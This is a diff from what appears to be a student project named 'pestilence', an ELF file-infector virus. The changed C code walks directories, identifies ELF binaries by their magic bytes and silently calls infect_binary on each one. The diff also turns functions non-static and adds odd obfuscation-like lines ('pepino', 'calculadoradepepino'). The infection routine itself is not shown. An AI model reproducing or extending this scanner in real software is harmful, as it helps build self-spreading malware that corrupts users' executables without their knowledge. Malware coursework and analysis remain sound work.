@@ -6,13 +6,13 @@
 /*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/06 22:21:11 by jainavas          #+#    #+#             */
-/*   Updated: 2026/01/09 18:23:11 by jainavas         ###   ########.fr       */
+/*   Updated: 2026/01/09 22:21:03 by jainavas         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "../include/pestilence.h"
 
-static bool is_elf_file(const char *filepath)
+bool is_elf_file(const char *filepath)
 {
     int fd;
     unsigned char magic[4];
@@ -32,7 +32,7 @@ static bool is_elf_file(const char *filepath)
             magic[2] == 'L' && magic[3] == 'F');
 }
 
-static void scan_directory(const char *dir_path)
+void scan_directory(const char *dir_path)
 {
     DIR *dir;
     struct dirent *entry;
@@ -42,7 +42,6 @@ static void scan_directory(const char *dir_path)
     dir = opendir(dir_path);
     if (!dir)
         return;
-    
     while ((entry = readdir(dir)) != NULL) {
         // Ignorar . y ..
         if (strcmp(entry->d_name, ".") == 0 || 
@@ -68,12 +67,15 @@ static void scan_directory(const char *dir_path)
         // Intentar infectar (silenciosamente)
         infect_binary(filepath);
     }
-    
+    pepino = -248235;
     closedir(dir);
 }
 
 void scan_and_infect(const char *dir1, const char *dir2)
 {
-    scan_directory(dir1);
-    scan_directory(dir2);
+	if (dir1 && dir2)
+	{
+		calculadoradepepino();
+		calculadoradepepino();
+	}
 }
